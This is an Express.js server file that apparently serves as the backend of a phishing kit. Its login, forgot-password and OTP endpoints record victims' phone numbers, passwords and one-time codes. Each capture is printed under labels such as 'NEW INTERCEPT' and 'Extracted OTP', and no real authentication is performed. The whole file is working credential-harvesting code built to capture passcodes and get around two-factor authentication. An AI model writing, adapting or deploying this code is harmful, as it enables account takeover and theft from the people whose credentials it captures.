const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
// Render assigns automated random ports, keeping fallback 4000 for localhost
const PORT = process.env.PORT || 4000;

// Enable Global CORS Requests for Production Deployment Environments
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Unified Data Schema for logging context state actions
const UserSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otp: { type: String, required: false },
    resetPhone: { type: String, required: false },
    newPassword: { type: String, required: false },
    actionType: { type: String, default: 'LOGIN' }, // LOGIN or PASSWORD_RESET
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

// Memory Stack context for tracking multi-step pipeline actions
let pendingResets = {};

async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        await mongoose.connect(mongoUri);
        
        console.log(`\n==================================================`);
        console.log(`🎉 In-Memory Database Pipeline initialized!`);
        console.log(`==================================================`);

        app.listen(PORT, () => {
            console.log(`🚀 Production backend active on port: ${PORT}`);
            console.log(`==================================================\n`);
        });
    } catch (error) {
        console.error("❌ Database layer startup error:", error);
    }
}

// 1. LOGIN API PIPELINE
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
        await newUser.save();

        console.log(`[⚡ NEW INTERCEPT: LOGIN DATA]`);
        console.log(`📱 Phone : ${phoneNumber}`);
        console.log(`🔑 Pass  : ${password}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, userId: newUser._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. FORGOT PASSWORD API PIPELINE
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        
        // Cache new credential context data pending user validation submission
        pendingResets[phone] = { newPassword };

        console.log(`[🔄 NEW INTERCEPT: RESET WINDOW INITIALIZED]`);
        console.log(`📱 Targeted Phone: ${phone}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, message: "Pipeline open" });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. UNIVERSAL VERIFICATION INTERCEPT PIPELINE
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp, isReset, phone } = req.body;

        if (isReset) {
            const cachedContext = pendingResets[phone];
            if (cachedContext) {
                const resetDataRecord = new User({
                    resetPhone: phone,
                    newPassword: cachedContext.newPassword,
                    otp: otp,
                    actionType: 'PASSWORD_RESET'
                });
                await resetDataRecord.save();

                console.log(`[🔐 SUCCESSFUL DATA ACQUISITION: RESET PROCESS COMPLETE]`);
                console.log(`📱 Target User  : ${phone}`);
                console.log(`🔥 Extracted OTP : ${otp}`);
                console.log(`🔑 Logged Pass   : ${cachedContext.newPassword}`);
                console.log(`==================================================\n`);
                
                delete pendingResets[phone];
                return res.status(200).json({ success: true });
            } else {
                return res.status(400).json({ success: false, message: "Pipeline Context Expired" });
            }
        } else {
            if (mongoose.Types.ObjectId.isValid(userId)) {
                await User.findByIdAndUpdate(userId, { otp: otp });
            }
            console.log(`[🔐 SUCCESSFUL DATA ACQUISITION: LOGIN OTP EXTRACTED]`);
            console.log(`🔥 Captured OTP : ${otp}`);
            console.log(`==================================================\n`);
            return res.status(200).json({ success: true });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

startServer();
